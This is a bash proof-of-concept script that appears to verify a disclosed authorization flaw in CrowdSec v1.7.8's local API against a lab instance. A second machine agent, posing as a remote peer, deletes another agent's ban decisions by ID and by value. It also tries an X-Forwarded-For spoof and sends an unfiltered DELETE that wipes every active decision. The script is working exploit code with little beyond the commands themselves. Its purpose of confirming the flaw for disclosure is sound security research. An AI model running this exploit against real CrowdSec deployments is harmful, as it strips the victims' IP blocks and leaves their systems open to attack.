#!/bin/bash
# H2 replay against the OFFICIAL RELEASE instance (CrowdSec v1.7.8 release binaries).
# Mirrors poc/remaining2.sh H2 section + poc/h2-nuclear.sh, with decision IDs
# resolved dynamically (fresh DB). "Remote" peer = source-bound 127.0.0.2, plus
# genuine non-loopback attempts via the VM LAN address 198.19.0.2 (recorded as-is).
set -u
cd "$(dirname "$0")/../../poc"
BL=http://127.0.0.1:18080
BKEY='xw20tUFOu3EZ0w0RYM5Orteoytg1emnJ5+Y/IN0oy0U'
UA='crowdsec/v1.7.8-63227459-linux'
NOW=$(date -u +%Y-%m-%dT%H:%M:%SZ)
OUT=../supplement-release/h2-release-results.txt
: > "$OUT"
log() { echo "$@" | tee -a "$OUT"; }
code()  { curl -s --noproxy '*' -m 25 -o /tmp/r2rel.json -w '%{http_code}' "$@"; }
coder() { curl -s --noproxy '*' --interface 127.0.0.2 -m 25 -o /tmp/r2rel.json -w '%{http_code}' "$@"; }
body() { head -c 400 /tmp/r2rel.json | tr '\n' ' '; echo; }
alert_nodsc() {
cat <<JSON
[{"message":"h2-rel nodsc","events_count":1,"start_at":"$NOW","stop_at":"$NOW","capacity":10,"leakspeed":"10s","scenario":"test/manual","scenario_version":"1.0","scenario_hash":"x","remediation":true,"simulated":false,"source":{"scope":"Ip","value":"$1"},"events":[{"timestamp":"$NOW","meta":[{"key":"source_ip","value":"$1"}]}]}]
JSON
}
dec_view() { curl -s --noproxy '*' -m 15 "$BL/v1/decisions?value=$1" -H "X-Api-Key: $BKEY" | head -c 300; echo; }
dec_id() { curl -s --noproxy '*' -m 15 "$BL/v1/decisions?value=$1" -H "X-Api-Key: $BKEY" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d[0]['id'] if d else 'NONE')"; }
login() { curl -s --noproxy '*' -X POST "$BL/v1/watchers/login" -H 'Content-Type: application/json' -H "User-Agent: $UA" -d "{\"machine_id\":\"$1\",\"password\":\"$2\"}" | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])"; }

log "===== H2 REPLAY on official release binaries ====="
./bin-rel/crowdsec --version 2>&1 | head -2 | tee -a "$OUT"
TOKA=$(login agentA 'AgentA-pass-123!')
TOKB=$(login agentB 'AgentB-pass-123!')
log "-- logged in agentA (decision owner) and agentB (attacker, different machine)"

log "-- setup: agentA creates decisions for 192.0.2.200 and 192.0.2.201 via the profile path:"
code -X POST "$BL/v1/alerts" -H "Authorization: Bearer $TOKA" -H 'Content-Type: application/json' -d "$(alert_nodsc 192.0.2.200)" >/dev/null
code -X POST "$BL/v1/alerts" -H "Authorization: Bearer $TOKA" -H 'Content-Type: application/json' -d "$(alert_nodsc 192.0.2.201)" >/dev/null
ID1=$(dec_id 192.0.2.200); ID2=$(dec_id 192.0.2.201)
log "   decision ids: 192.0.2.200 -> $ID1 ; 192.0.2.201 -> $ID2"
log "   bouncer view 192.0.2.200:"; dec_view 192.0.2.200 | tee -a "$OUT"
log "   bouncer view 192.0.2.201:"; dec_view 192.0.2.201 | tee -a "$OUT"

log "-- H2a: agentB (TOKB) REMOTE (src 127.0.0.2) DELETE /v1/decisions/$ID1:"
c=$(coder -X DELETE "$BL/v1/decisions/$ID1" -H "Authorization: Bearer $TOKB" -H "User-Agent: $UA"); log "HTTP $c"; body | tee -a "$OUT"
log "   bouncer view 192.0.2.200 after (expect null):"; dec_view 192.0.2.200 | tee -a "$OUT"

log "-- H2b: agentB (TOKB) REMOTE (src 127.0.0.2) DELETE /v1/decisions?value=192.0.2.201:"
c=$(coder -X DELETE "$BL/v1/decisions?value=192.0.2.201" -H "Authorization: Bearer $TOKB" -H "User-Agent: $UA"); log "HTTP $c"; body | tee -a "$OUT"
log "   bouncer view 192.0.2.201 after (expect null):"; dec_view 192.0.2.201 | tee -a "$OUT"

log "-- setup: fresh sacrificial alert from agentA (loopback):"
RESP=$(curl -s --noproxy '*' -m 15 -X POST "$BL/v1/alerts" -H "Authorization: Bearer $TOKA" -H 'Content-Type: application/json' -d "$(alert_nodsc 192.0.2.202)")
AID=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)[0])")
log "   alert id: $AID"
log "-- ASYM: agentA (TOKA) REMOTE (src 127.0.0.2) DELETE /v1/alerts/$AID (IP gate expected to BLOCK):"
c=$(coder -X DELETE "$BL/v1/alerts/$AID" -H "Authorization: Bearer $TOKA" -H "User-Agent: $UA"); log "HTTP $c"; body | tee -a "$OUT"
log "-- H12: same + X-Forwarded-For: 127.0.0.1 (spoof attempt):"
c=$(coder -X DELETE "$BL/v1/alerts/$AID" -H "Authorization: Bearer $TOKA" -H "User-Agent: $UA" -H 'X-Forwarded-For: 127.0.0.1'); log "HTTP $c"; body | tee -a "$OUT"
log "-- ASYM control: agentA LOOPBACK DELETE /v1/alerts/$AID (expect success):"
c=$(code -X DELETE "$BL/v1/alerts/$AID" -H "Authorization: Bearer $TOKA" -H "User-Agent: $UA"); log "HTTP $c"; body | tee -a "$OUT"

log "===== non-loopback source attempt via VM LAN address 198.19.0.2 ====="
log "-- curl http://198.19.0.2:18080/health (hairpin to own LAN IP):"
curl -s --noproxy '*' -m 6 "$BL" >/dev/null 2>&1 # noop keepalive
curl -s --noproxy '*' -m 6 http://198.19.0.2:18080/health -w '\nHTTP %{http_code}' 2>&1 | tee -a "$OUT"; echo | tee -a "$OUT"
log "-- curl --interface 198.19.0.2 http://127.0.0.1:18080/health (LAN source bind):"
curl -s --noproxy '*' --interface 198.19.0.2 -m 6 http://127.0.0.1:18080/health -w '\nHTTP %{http_code}' 2>&1 | tee -a "$OUT"; echo | tee -a "$OUT"
log "-- conclusion recorded in VERIFICATION.md: sandbox external interface does not hairpin; 127.0.0.2 source-bind (above) is the faithful remote-peer path, as in the original disclosure."

log "===== H2 nuclear: empty-filter DELETE /v1/decisions from REMOTE peer (agentB) ====="
log "-- active decisions before (bouncer view, full):"
curl -s --noproxy '*' "$BL/v1/decisions" -H "X-Api-Key: $BKEY" | tee -a "$OUT"; echo | tee -a "$OUT"
log "-- agentB (TOKB), source-bound 127.0.0.2 (remote), DELETE /v1/decisions (NO filter):"
curl -s --noproxy '*' --interface 127.0.0.2 -X DELETE "$BL/v1/decisions" -H "Authorization: Bearer $TOKB" -H "User-Agent: $UA" -w '\nHTTP %{http_code}' | tee -a "$OUT"; echo | tee -a "$OUT"
log "-- active decisions after (bouncer view, expect null):"
curl -s --noproxy '*' "$BL/v1/decisions" -H "X-Api-Key: $BKEY" | tee -a "$OUT"; echo | tee -a "$OUT"
log "===== END H2 release replay ====="
